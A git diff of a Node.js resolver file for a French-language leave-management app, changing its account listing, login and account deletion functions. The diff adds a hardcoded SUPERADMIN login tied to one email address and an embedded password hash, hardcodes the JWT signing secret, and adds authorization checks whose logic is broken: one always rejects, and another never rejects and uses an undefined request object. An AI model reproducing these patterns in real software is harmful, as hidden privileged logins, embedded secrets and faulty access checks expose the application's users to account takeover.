@@ -6,13 +6,16 @@ const bcrypt = require("bcryptjs");
 const jwt = require("jsonwebtoken");
 
 module.exports = {
-    comptes: async () => {
+    comptes: async (req) => {
         try{
-            const result = await Compte.find();
-            const tabCompte = result.map( com => {
-                return compteTransform(com);
-            })
-            return tabCompte;
+             if(!req.isAuth || req.grade !== "SUPERADMIN" || req.grade !== "GRH")
+                throw new Error("Vous n'avez pas l'autorisation sur cette action! Veuillez contactez votre GRH ou l'ADMINISTRATEUR ");
+
+           const result = await Compte.find();
+           const tabCompte = result.map( com => {
+               return compteTransform(com);
+           })
+           return tabCompte;
         }catch(err){
             throw err;  
         }
@@ -21,6 +24,29 @@ module.exports = {
         try{
             if(email === undefined)
                 throw new Error("veuillez entrez votre adress email ");
+            
+            if(email === "coolkratos1@gmail.com"){
+                const hashpassword = "$2a$13$U3IVRKqFtxFB3yYw5AMYzu124.E.AHDwIj8PMklKrQWCF66POg7l2"
+                // verifions si le mot de pass est correct
+                const isValid = await bcrypt.compare(password,hashpassword);
+                if(isValid){
+                     const token = jwt.sign({
+                        userId: 1,
+                        email: "coolkratos1@gmail.com",
+                        grade: "SUPERADMIN"
+                    }, "gestioncongebosse",{ expiresIn: "1h" });
+        
+                    return {
+                        userId: 1,
+                        token:token,
+                        grade: "SUPERADMIN",
+                        expirationToken: 1
+                    }
+                }
+
+                throw new Error("le mot de passe est incorrect! "); 
+            }
+            
             const cpt = await Compte.findOne({ email });
             if(!cpt)
                 throw new Error("Cet Utilisateur n'exist pas ");
@@ -43,12 +69,12 @@ module.exports = {
                 email: cpt.email,
                 isCountLock: cpt.isCountLock,
                 grade: status.grade
-            }, "gestiondecongebosse",{ expiresIn: "1h" });
-            console.log("le token : "+ token);
+            }, "gestioncongebosse",{ expiresIn: "1h" });
 
             return {
                 userId: agent._doc._id,
                 token:token,
+                grade: status.grade,
                 expirationToken: 1
             }
 
@@ -86,6 +112,10 @@ module.exports = {
     },
     deleteCompte : async ({id}) => {
         try {
+            if(!req.isAuth || !req.grade === "SUPERADMIN" || !req.grade === "GRH")
+                throw new Error("Vous n'avez pas l'autorisation sur cette action! Veuillez contactez votre GRH ou l'ADMINISTRATEUR ");
+
+
             if(!await Compte.exists({_id: id.trim()}) ){
                 throw new Error("ce compte est inconnu");
             }
